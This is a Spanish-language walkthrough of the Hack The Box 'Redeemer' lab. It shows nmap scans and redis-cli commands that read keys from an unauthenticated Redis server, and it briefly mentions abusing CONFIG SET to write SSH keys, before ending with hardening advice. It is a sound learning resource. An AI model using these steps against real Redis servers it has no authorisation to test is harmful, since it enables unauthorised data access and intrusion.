# Hack The Box — Starting Point 4: Redeemer

Notas sobre **Redis** (puerto **6379/tcp**), almacén clave-valor en memoria, y acceso sin autenticación con el cliente **`redis-cli`**. **No publiques la flag**; aquí se documenta el flujo y los comandos.

---

## Contexto

**Redeemer** introduce **Redis**: una base de datos **clave-valor** en memoria, muy usada como caché, broker de mensajes o cola. Por defecto, en instalaciones mal configuradas escucha en **0.0.0.0:6379** **sin contraseña**, lo que permite a cualquiera leer/escribir datos o ejecutar comandos administrativos.

El reto consiste en conectarse al puerto 6379 con `redis-cli`, enumerar las bases de datos y leer el valor de una clave que contiene la flag.

---

## Conceptos del módulo (respuestas a las tareas)

### Tarea 1 — ¿Qué tipo de base de datos es Redis? Tres palabras.

**In-memory key-value** (almacén clave-valor en memoria). También se la describe como *NoSQL key-value store*. Los datos viven en RAM (con persistencia opcional a disco vía RDB/AOF), lo que la hace muy rápida.

### Tarea 2 — ¿Qué tipo de modelo de consulta utiliza Redis?

**Key-value** (clave-valor). No usa SQL: cada dato se guarda asociado a una clave única y se accede por esa clave con comandos como `GET`, `SET`, `KEYS`, etc.

### Tarea 3 — ¿Qué comando se utiliza para escanear redes en busca de puertos abiertos en un sistema concreto?

**`nmap`**. El estándar de facto para descubrimiento de puertos/servicios.

### Tarea 4 — ¿Qué flag se usa con Nmap para escanear puertos TCP?

**`-sT`** (TCP **connect scan**) o **`-sS`** (SYN scan / *stealth*) si tienes privilegios de root. Por defecto, `nmap` ejecutado como root usa `-sS`; como usuario sin privilegios cae a `-sT`.

```bash
sudo nmap -sS -p- TARGET_IP
```

- `-sS`: SYN scan (no completa el handshake; más rápido y discreto).
- `-p-`: **todos** los puertos TCP (1-65535).

### Tarea 5 — ¿Cuál es el puerto por defecto de Redis?

**6379/tcp**.

### Tarea 6 — ¿Qué herramienta de línea de comandos se utiliza para interactuar con el servidor Redis?

**`redis-cli`**. Cliente oficial; viene en el paquete `redis-tools` en Debian/Kali.

```bash
sudo apt install redis-tools
```

### Tarea 7 — ¿Qué comando se utiliza para obtener información y estadísticas sobre el servidor Redis?

**`info`**. Devuelve secciones como `# Server`, `# Clients`, `# Memory`, `# Keyspace`, etc.

```text
127.0.0.1:6379> info
```

### Tarea 8 — Bajo la sección "keyspace" de la salida del comando `info`, ¿cuántas bases de datos hay?

**1** (la `db0`, donde está la flag en este lab). Redis tiene 16 bases por defecto (`db0`–`db15`) pero solo muestra las que contienen claves.

## Metodología: reconocimiento

### 1. Conectividad

```bash
ping -c 2 TARGET_IP
```

### 2. Nmap

**Escaneo completo de puertos TCP:**

```bash
nmap -sV -p- --min-rate=1000 TARGET_IP
```

- `-sV`: detección de versión.
- `-p-`: todos los puertos.
- `--min-rate=1000`: acelera enviando ≥1000 paquetes/segundo (ojo: ruidoso).

**Esperado:** `6379/tcp open redis Redis key-value store 5.0.7`.

**Solo el puerto Redis con scripts NSE:**

```bash
nmap -p 6379 -sV --script redis-info TARGET_IP
```

- `redis-info`: script de Nmap que consulta `INFO` y muestra versión, modo, OS, etc.

## Herramienta principal: `redis-cli`

### Conectar al servidor

```bash
redis-cli -h TARGET_IP
```

- `-h`: host remoto. Sin `-h`, conecta a `127.0.0.1`.
- `-p 6379`: puerto (opcional, es el default).
- `-a contraseña`: si hubiera `requirepass`. En Redeemer **no** la hay.

Si conecta, verás un prompt:

```text
TARGET_IP:6379>
```

### Comandos básicos dentro de Redis

| Comando | Función |
|---------|---------|
| `info` | Estadísticas del servidor (secciones server, memory, keyspace…) |
| `client list` | Sesiones de clientes activas |
| `config get *` | Parámetros de configuración (peligroso si está expuesto) |
| `select N` | Cambia a la base de datos `N` (0–15). En Redeemer: `select 0` |
| `keys *` | **Lista todas las claves** de la DB activa |
| `type clave` | Tipo de dato: `string`, `list`, `set`, `hash`, `zset`, `stream` |
| `get clave` | Lee el valor (si el tipo es `string`) |
| `lrange clave 0 -1` | Lee todos los elementos si es `list` |
| `hgetall clave` | Lee todos los pares campo/valor si es `hash` |
| `smembers clave` | Elementos si es `set` |
| `exit` / `quit` | Salir |

### Flujo típico de explotación en Redeemer

```text
> info
> select 0
> keys *
> type <nombre_clave>
> get <nombre_clave>
```

- `keys *` muestra el listado completo.
- `get <clave>` te entrega la flag si esa clave es de tipo `string`.

**Equivalente en una sola línea (no interactivo):**

```bash
redis-cli -h TARGET_IP keys '*'
redis-cli -h TARGET_IP get flag
```

## Por qué Redis acaba expuesto

- En instalaciones rápidas con Docker/dev se deja escuchando en `0.0.0.0` sin `bind 127.0.0.1`.
- Sin `requirepass` ni `protected-mode yes`.
- Sin firewall delante (cloud sin security group bien configurado).
- En atacantes reales: lectura/escritura de claves, **abuso de `CONFIG SET` para escribir archivos** (p. ej. una clave SSH autorizada en `~/.ssh/authorized_keys`) y RCE en muchos casos. En Redeemer este vector no es necesario: la flag está como valor de una clave.

---

## Defensa rápida (mini-cheatsheet)

- `bind 127.0.0.1 ::1` en `redis.conf`.
- `protected-mode yes`.
- `requirepass <password fuerte>` y usuarios ACL en Redis ≥6.
- Firewall/Security Group: solo permitir el origen legítimo.
- TLS si el cliente lo soporta y la versión de Redis lo permite.

## Resumen de comandos

| Comando | Propósito |
|---------|-----------|
| `nmap -sV -p- TARGET_IP` | Encontrar 6379 y versión |
| `nmap -p 6379 --script redis-info TARGET_IP` | Info del servicio sin abrir cliente |
| `redis-cli -h TARGET_IP` | Cliente interactivo Redis |
| `info` | Estado del servidor |
| `select 0` | Elegir base de datos |
| `keys *` | Listar claves |
| `get <clave>` | Leer valor (flag) |
